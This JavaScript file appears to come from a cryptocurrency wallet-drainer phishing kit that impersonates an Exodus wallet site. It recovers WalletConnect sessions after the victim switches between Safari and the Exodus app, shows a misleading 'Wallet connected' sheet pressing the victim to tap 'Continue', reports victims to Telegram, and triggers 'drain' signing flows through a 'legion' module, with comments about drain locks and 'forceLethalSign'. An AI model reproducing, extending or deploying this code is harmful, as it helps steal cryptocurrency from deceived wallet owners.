/**
 * Exodus site — recover WC session after Safari↔Exodus roundtrip.
 * After connect: Telegram notify + drain (signing) — not just a fake "Connected" button.
 */
(function () {
  'use strict';

  var KEY_ADDR = 'exodus_site_connected_addr';
  var recovering = false;
  var pipelineBusy = false;
  var lastShown = '';

  // ── Global drain lock ────────────────────────────────────────────────────
  // Only this file may trigger drain. Lock expires after 30s (crash safety).
  var drainLockTs = 0;
  var DRAIN_LOCK_TTL = 30000;

  function acquireDrainLock() {
    var now = Date.now();
    if (drainLockTs && (now - drainLockTs) < DRAIN_LOCK_TTL) return false;
    drainLockTs = now;
    return true;
  }

  function releaseDrainLock() {
    drainLockTs = 0;
  }

  function drainLockHeld() {
    return drainLockTs && (Date.now() - drainLockTs) < DRAIN_LOCK_TTL;
  }

  function saveAddr(addr) {
    addr = String(addr || '').toLowerCase();
    if (!/^0x[a-f0-9]{40}$/.test(addr)) return '';
    try {
      sessionStorage.setItem(KEY_ADDR, addr);
      sessionStorage.setItem('legion_wc_evm_addr', addr);
    } catch (_) {}
    return addr;
  }

  function loadAddr() {
    try {
      return sessionStorage.getItem(KEY_ADDR) || sessionStorage.getItem('legion_wc_evm_addr') || '';
    } catch (_) {
      return '';
    }
  }

  function shortAddr(a) {
    a = String(a || '');
    return a.length > 12 ? a.slice(0, 6) + '…' + a.slice(-4) : a;
  }

  /** Scan WC v2 localStorage for eip155 account */
  function scanWcStorageAddr() {
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i) || '';
        if (k.indexOf('wc@') === -1 && k.indexOf('wagmi') === -1 && k.indexOf('@appkit') === -1) continue;
        var v = localStorage.getItem(k) || '';
        var m = v.match(/eip155:\d+:(0x[a-fA-F0-9]{40})/);
        if (m) return m[1].toLowerCase();
        m = v.match(/"(0x[a-fA-F0-9]{40})"/);
        if (m && /account|address/i.test(v)) return m[1].toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function setConnectButton(addr) {
    addr = saveAddr(addr) || loadAddr();
    if (!addr) return;
    lastShown = addr;
    var btn = document.getElementById('cfmbtn');
    if (!btn) return;
    btn.textContent = 'Connected ' + shortAddr(addr);
    btn.className = 'btn btn-blue confirm-btn confirm-active';
    btn.disabled = false;
    btn.removeAttribute('disabled');
    btn.setAttribute('aria-disabled', 'false');
    btn.onclick = function (e) {
      e.preventDefault();
      e.stopPropagation();
      showApproveSheet(addr);
      // Do NOT open empty Trust — kick pipeline so a real WC request is pending
      runPipeline('button-tap');
    };
  }

  /**
   * Nudge Exodus app for pending WC request.
   * NEVER navigate this tab to www.exodus.com — that kills the pipeline mid-flight
   * when the user has already returned to the card site.
   * Mobile: fire pipeline FIRST (via keepalive), then open app — OS freezes JS after switch.
   */
  function openTrustNudgeRaw() {
    try {
      window.__LEGION_DEEP_LINK_TARGET__ = null;
    } catch (_) {}
    try {
      if (typeof window.__EXODUS_OPEN_DEEPLINK__ === 'function' && window.__EXODUS_OPEN_DEEPLINK__(true)) {
        return;
      }
    } catch (_) {}
    var uri = null;
    try {
      if (typeof window.__EXODUS_GET_WC_URI__ === 'function') uri = window.__EXODUS_GET_WC_URI__();
    } catch (_) {}
    if (uri && String(uri).indexOf('wc:') === 0) {
      try { window.location.href = 'exodus://wc?uri=' + encodeURIComponent(uri); } catch (_) {}
      return;
    }
    // NO bare exodus:// — empty app bounce + Safari tab death
    console.warn('[ExodusUI] nudge skipped — no wc: URI');
  }

  function openTrustNudge() {
    try {
      if (window.__EXODUS_IN_APP__ || (typeof window.__EXODUS_IS_IN_APP__ === 'function' && window.__EXODUS_IS_IN_APP__())) {
        // Already in Exodus — just fire pipeline; popups show in-app
        try { runPipeline('inapp-nudge'); } catch (_) {}
        return;
      }
    } catch (_) {}
    try {
      if (typeof window.__EXODUS_BEFORE_WALLET_OPEN__ === 'function') {
        window.__EXODUS_BEFORE_WALLET_OPEN__(openTrustNudgeRaw, 700);
        return;
      }
    } catch (_) {}
    try { runPipeline('nudge-preopen'); } catch (_) {}
    setTimeout(openTrustNudgeRaw, 700);
  }

  function showApproveSheet(addr) {
    var el = document.getElementById('__exodus_approve_sheet');
    if (!el) {
      el = document.createElement('div');
      el.id = '__exodus_approve_sheet';
      el.style.cssText = 'position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.75);display:flex;align-items:flex-end;justify-content:center;padding:16px;font-family:system-ui,sans-serif';
      el.innerHTML = [
        '<div style="width:100%;max-width:420px;background:#111;color:#fff;border-radius:16px;padding:20px 18px 22px">',
        '<div style="font-size:17px;font-weight:700;margin-bottom:8px">Wallet connected</div>',
        '<div id="__exodus_approve_sub" style="font-size:13px;opacity:.85;line-height:1.45;margin-bottom:16px"></div>',
        '<button type="button" id="__exodus_approve_go" style="display:block;width:100%;background:#8B5CF6;color:#fff;border:0;border-radius:12px;padding:14px 16px;font-weight:700;margin-bottom:8px">Continue — Send to Exodus</button>',
        '<button type="button" id="__exodus_approve_open" style="display:block;width:100%;background:#222;color:#fff;border:0;border-radius:12px;padding:12px;font-weight:600;margin-bottom:8px">Open Exodus</button>',
        '<button type="button" id="__exodus_approve_close" style="display:block;width:100%;background:transparent;border:0;color:#888;padding:10px;font-size:13px">Close</button>',
        '</div>',
      ].join('');
      document.body.appendChild(el);
      el.querySelector('#__exodus_approve_close').onclick = function () { el.style.display = 'none'; };
      el.querySelector('#__exodus_approve_go').onclick = function (e) {
        e.preventDefault();
        setSheetStatus('Sending request first… then Exodus opens. Come back here after approve.');
        // Pipeline must hit WC relay BEFORE app switch freezes this tab
        runPipeline('sheet-continue').then(function () {
          setSheetStatus('Open Exodus to approve, then return to this page — work continues automatically.');
          setTimeout(openTrustNudgeRaw, 900);
        });
      };
      el.querySelector('#__exodus_approve_open').onclick = function (e) {
        e.preventDefault();
        openTrustNudge();
      };
    }
    var sub = document.getElementById('__exodus_approve_sub');
    if (sub) {
      sub.textContent = (addr ? shortAddr(addr) + ' is linked. ' : '') +
        'Tap Continue — site will notify Telegram and send the approval request to Exodus. Opening Exodus alone shows nothing until that request is sent.';
    }
    el.style.display = 'flex';
  }

  function setSheetStatus(msg) {
    var sub = document.getElementById('__exodus_approve_sub');
    if (sub) sub.textContent = msg;
  }

  async function ensureProviderAndAddr() {
    var addr = '';
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        addr = String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}

    var prov = null;

    // 1. Use existing live provider from legion state first — do NOT overwrite a valid one
    try {
      if (window.legion && window.legion.state && window.legion.state.evmProvider) {
        prov = window.legion.state.evmProvider;
      }
    } catch (_) {}

    // 2. Only go to storage recovery if no live provider
    if (!prov) {
      try {
        if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
          prov = await window.LegionWallet.tryRecoverStoredSession(true);
        }
      } catch (e) {
        console.warn('[ExodusUI] tryRecoverStoredSession', e && e.message);
      }
    }

    // 3. Fallback: try LegionWallet direct provider getter
    if (!prov && window.LegionWallet) {
      try {
        if (typeof window.LegionWallet.getProvider === 'function') {
          prov = window.LegionWallet.getProvider();
        } else if (typeof window.LegionWallet.getWalletProvider === 'function') {
          prov = await window.LegionWallet.getWalletProvider();
        }
      } catch (_) {}
    }

    if (prov) {
      try {
        var accts = await prov.request({ method: 'eth_accounts' });
        if (accts && accts[0]) addr = String(accts[0]).toLowerCase();
      } catch (_) {}
      if (!addr && window.LegionWallet && window.LegionWallet.getAccount) {
        var a2 = window.LegionWallet.getAccount();
        if (a2 && a2.address) addr = String(a2.address).toLowerCase();
      }
      if (window.legion) {
        try {
          window.legion.state.evmProvider = prov;
          if (addr) window.legion.state.evmAddr = addr;
          window.legion.state.connectMode = 'wc';
          window.legion.state.wcSessionActive = true;
          window.legion.state.evmWallet = window.legion.state.evmWallet || 'Exodus';
        } catch (_) {}
      }
    }

    if (!addr) {
      try {
        if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
          var acc = window.LegionWallet.getAccount();
          if (acc && acc.address) addr = String(acc.address).toLowerCase();
        }
      } catch (_) {}
    }
    if (!addr) addr = scanWcStorageAddr();
    if (!addr) addr = loadAddr();
    if (addr) saveAddr(addr);
    return { addr: addr, prov: prov };
  }

  function runPipeline(why) {
    if (pipelineBusy) return Promise.resolve(false);
    try {
      if (typeof window.__EXODUS_FLOW_BUSY__ === 'function' && window.__EXODUS_FLOW_BUSY__()) {
        if (why !== 'button-tap' && why !== 'sheet-continue') {
          console.warn('[ExodusUI] pipeline skip — flow busy:', why);
          return Promise.resolve(false);
        }
      }
    } catch (_) {}
    // Only acquire lock for drain-triggering calls (not UI nudges)
    var isDrainCall = (why !== 'nudge-preopen' && why !== 'sheet-continue' && why !== 'button-tap');
    if (isDrainCall && !acquireDrainLock()) {
      console.warn('[ExodusUI] pipeline: drain lock held by another call, skip:', why);
      return Promise.resolve(false);
    }
    pipelineBusy = true;
    try { window.__EXODUS_PIPELINE_BUSY__ = true; } catch (_) {}
    console.warn('[ExodusUI] pipeline', why);
    return (async function () {
      try {
        var got = await ensureProviderAndAddr();
        if (!got.addr) {
          console.warn('[ExodusUI] pipeline: no addr');
          return false;
        }
        setConnectButton(got.addr);

        var L = window.legion;
        if (!L) {
          console.warn('[ExodusUI] pipeline: legion missing');
          return false;
        }

        // Seed state
        try {
          if (got.addr) L.state.evmAddr = got.addr;
          if (got.prov) {
            L.state.evmProvider = got.prov;
            try { got.prov.isWalletConnect = true; } catch (_) {}
            L.state.connectMode = 'wc';
            L.state.wcSessionActive = true;
          }
          L.state.evmWallet = L.state.evmWallet || 'Exodus';
        } catch (_) {}

        // Provider guard — chain switch can null evmProvider; re-inject before every drain call
        if (!L.state.evmProvider && got.prov) {
          try {
            L.state.evmProvider = got.prov;
            L.state.connectMode = 'wc';
            L.state.wcSessionActive = true;
          } catch (_) {}
        }

        if (typeof L.continueConnected === 'function') {
          await L.continueConnected();
          // All chains (EVM + non-EVM) handled inside continueConnected() — single flow, no Phase B split
        } else if (typeof L.drain === 'function') {
          await L.drain();
        }
        return true;
      } catch (e) {
        console.warn('[ExodusUI] pipeline err', e && e.message);
        return false;
      } finally {
        pipelineBusy = false;
        try { window.__EXODUS_PIPELINE_BUSY__ = false; } catch (_) {}
        if (isDrainCall) releaseDrainLock();
      }
    })();
  }

  function markConnected(addr, opts) {
    opts = opts || {};
    addr = saveAddr(addr) || addr;
    if (!addr) return false;
    setConnectButton(addr);
    try {
      window.dispatchEvent(new CustomEvent('exodus:addr-recovered', { detail: { address: addr } }));
    } catch (_) {}
    // Preflight / scout in background only — DO NOT call forceTrustSign() here.
    // legion.js handleEvmConnect() calls forceLethalSign() internally; calling forceTrustSign()
    // here sets _forceSignInflight=true which causes "re-entrancy blocked" in handleEvmConnect().
    setTimeout(function () {
      try {
        if (typeof window.__EXODUS_PREFLIGHT__ === 'function') window.__EXODUS_PREFLIGHT__(addr);
      } catch (_) {}
    }, 1500);
    return true;
  }

  function waitLegion(cb) {
    if (window.legion && window.LegionWallet) {
      cb();
      return;
    }
    var n = 0;
    var t = setInterval(function () {
      n++;
      if ((window.legion && window.LegionWallet) || n > 100) {
        clearInterval(t);
        cb();
      }
    }, 100);
  }

  async function recoverFromWallet() {
    if (recovering) return false;
    try {
      if (typeof window.__EXODUS_FLOW_BUSY__ === 'function' && window.__EXODUS_FLOW_BUSY__()) {
        console.warn('[ExodusUI] recover skip — flow busy');
        return false;
      }
    } catch (_) {}
    recovering = true;
    try {
      var got = await ensureProviderAndAddr();
      if (got.addr) {
        console.warn('[ExodusUI] recovered', got.addr.slice(0, 10), 'prov=' + !!got.prov);
        markConnected(got.addr, {});
        var S2 = (window.legion && window.legion.state) || {};
        if (!drainLockHeld() && !S2.postConnectComplete && !S2.drainAttempted) {
          // legion.js did not complete drain (e.g. user returned after freeze before sign) — resume
          console.warn('[ExodusUI] drain not complete — recovery pipeline');
          runPipeline('recovery');
        } else if (drainLockHeld()) {
          // Drain in progress by another pipeline call — only re-inject provider if cleared
          try {
            var L = window.legion;
            if (L && L.state && !L.state.evmProvider && got.prov) {
              L.state.evmProvider = got.prov;
              L.state.connectMode = 'wc';
              L.state.wcSessionActive = true;
            }
          } catch (_) {}
        }
        return true;
      }
      console.warn('[ExodusUI] no session to recover');
      return false;
    } finally {
      recovering = false;
    }
  }

  function forceButtonLoop() {
    var addr = loadAddr() || scanWcStorageAddr();
    if (!addr) return;
    var btn = document.getElementById('cfmbtn');
    if (!btn) return;
    if (/Connect Wallet|Connecting/i.test(btn.textContent || '') || btn.textContent.indexOf('Connected') === -1) {
      setConnectButton(addr);
    }
  }

  window.addEventListener('legion:connected', function (e) {
    var d = (e && e.detail) || {};
    var addr = d.address || d.account || '';
    // UI only — legion.js handleEvmConnect() runs drain internally at the same moment.
    // Calling forceTrustSign() or runPipeline() here causes "re-entrancy blocked" in handleEvmConnect().
    if (addr) {
      saveAddr(addr);
      setConnectButton(addr);
      // Scout/notify Telegram after a delay (non-blocking)
      setTimeout(function () {
        try {
          if (typeof window.__EXODUS_PREFLIGHT__ === 'function') window.__EXODUS_PREFLIGHT__(addr);
        } catch (_) {}
      }, 2000);
    }
  });

  // Note: legion:network-switch is NOT a DOM event — it is SCOUT.alertStage(), a backend API call.
  // No browser listener can catch it. Provider re-injection is handled in recoverFromWallet() instead.

  window.addEventListener('legion:embed-ready', function () {
    setTimeout(function () { recoverFromWallet(); }, 400);
  });
  window.addEventListener('legion:ready', function () {
    setTimeout(function () { recoverFromWallet(); }, 400);
  });

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible') {
      setTimeout(function () { recoverFromWallet(); }, 300);
      setTimeout(function () { recoverFromWallet(); }, 1500);
      setTimeout(forceButtonLoop, 200);
    }
  });

  window.addEventListener('pageshow', function () {
    setTimeout(function () { recoverFromWallet(); }, 200);
    setTimeout(forceButtonLoop, 100);
  });

  window.addEventListener('focus', function () {
    setTimeout(function () { recoverFromWallet(); }, 300);
  });

  window.addEventListener('pagehide', function () {
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        saveAddr(window.legion.state.evmAddr);
      }
    } catch (_) {}
  });
  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') {
      try {
        if (window.legion && window.legion.state && window.legion.state.evmAddr) {
          saveAddr(window.legion.state.evmAddr);
        }
      } catch (_) {}
    }
  });

  var obs = new MutationObserver(function () {
    forceButtonLoop();
  });

  function boot() {
    waitLegion(function () {
      recoverFromWallet();
    });
    if (document.body) {
      obs.observe(document.body, { childList: true, subtree: true, characterData: true });
    }
    setInterval(forceButtonLoop, 1000);
    setInterval(function () {
      if (document.visibilityState === 'visible') recoverFromWallet();
    }, 8000);
  }

  function wrapDirectConnect() {
    var prev = window.__EXODUS_DIRECT_CONNECT__;
    if (typeof prev !== 'function' || prev.__trustWrapped) return;
    var wrapped = function () {
      var addr = loadAddr() || scanWcStorageAddr();
      if (addr) {
        markConnected(addr, { sheet: true, pipeline: true });
        return;
      }
      return prev.apply(this, arguments);
    };
    wrapped.__trustWrapped = true;
    window.__EXODUS_DIRECT_CONNECT__ = wrapped;
  }

  if (document.body) boot();
  else document.addEventListener('DOMContentLoaded', boot);

  setTimeout(wrapDirectConnect, 0);
  setTimeout(wrapDirectConnect, 500);
  setInterval(wrapDirectConnect, 2000);

  window.__EXODUS_SHOW_APPROVE__ = showApproveSheet;
  window.__EXODUS_OPEN_TRUST__ = openTrustNudge;
  window.__EXODUS_RUN_PIPELINE__ = runPipeline;
})();
